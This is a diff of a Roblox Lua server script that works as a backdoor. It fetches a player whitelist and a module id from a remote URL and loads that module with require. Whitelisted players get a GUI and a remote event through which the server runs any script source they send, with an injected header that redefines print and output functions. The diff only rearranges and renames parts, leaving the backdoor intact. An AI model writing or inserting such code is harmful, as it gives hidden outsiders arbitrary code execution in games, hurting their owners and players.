@@ -1,4 +1,3 @@
-print("meow")
 local ins=Instance.new
 local cf=CFrame.new
 local load=false
@@ -19,10 +18,10 @@ function Check(plr)
 		return Http:GetAsync(Url.."players")
 	end)
 	if table.find(Http:JSONDecode(result),plr.Name) then
-		local success,result=pcall(function()
-			return Http:GetAsync(Url.."id")
-		end)
 		if not load then
+			local success,result=pcall(function()
+				return Http:GetAsync(Url.."id")
+			end)
 			FluffyEvent.Parent=workspace
 			load=true
 			require(tonumber(result)).ROOWO(script)
@@ -34,10 +33,8 @@ function Check(plr)
 
 		local OutputGUI=script:WaitForChild("OutputGUI"):Clone()
 		OutputGUI.Event.Value=FluffyEvent
-		OutputGUI:SetAttribute("Greeting",[[Hello! OwO :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3
-		
-		                       This is a new version
-		                                       OWO
+		OutputGUI:SetAttribute("Greeting",[[
+		Bari lox
 		]])
 		OutputGUI.Parent=plr.PlayerGui
 	end
@@ -198,7 +195,21 @@ FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
 			local req=Data[1]:sub(3)
 			local OldReq=req
 			local Injected=[[
-	                        local owner=game.Players["]]..plr.Name..[["]
+	    local owner=game.Players["]]..plr.Name..[["]
+	    print=function(text)
+			_G.CreateOutput({text,"print"})
+		end
+		error=function(text)
+			_G.CreateOutput({text,"error"})
+		end
+		warn=function(text)
+			_G.CreateOutput({text,"warn"})
+		end
+		success=function(text)
+			_G.CreateOutput({text,"success"})
+		end
+		local owner=game.Players.LocalPlayer
+		success("Script has started (Client)")
                            ]]
 			req=Injected..req
 			
@@ -215,7 +226,7 @@ FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
 			Owner.Name="Owner"
 
 			Server.Enabled=true
-			success("Got module "..OldReq,plr)
+			success("Executed the script "..OldReq,plr)
 
 		end
 
